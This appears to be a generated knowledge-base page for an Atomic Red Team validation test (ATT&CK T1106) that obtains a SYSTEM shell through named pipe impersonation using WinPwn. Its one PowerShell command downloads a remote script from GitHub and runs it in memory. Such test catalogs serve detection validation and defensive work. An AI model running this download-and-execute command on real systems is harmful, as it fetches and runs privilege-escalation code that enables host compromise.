---
atomic_guid: "e1f93a06-1649-4f07-89a8-f57279a7d60e"
title: "WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique"
framework: "atomic"
generated: "true"
attack_technique_id: "T1106"
attack_technique_name: "Native API"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1106/T1106.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "e1f93a06-1649-4f07-89a8-f57279a7d60e"
  - "WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique

Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn

## Metadata

- Atomic GUID: e1f93a06-1649-4f07-89a8-f57279a7d60e
- Technique: T1106: Native API
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1106/T1106.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1106-native_api|T1106]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1106/T1106.yaml)
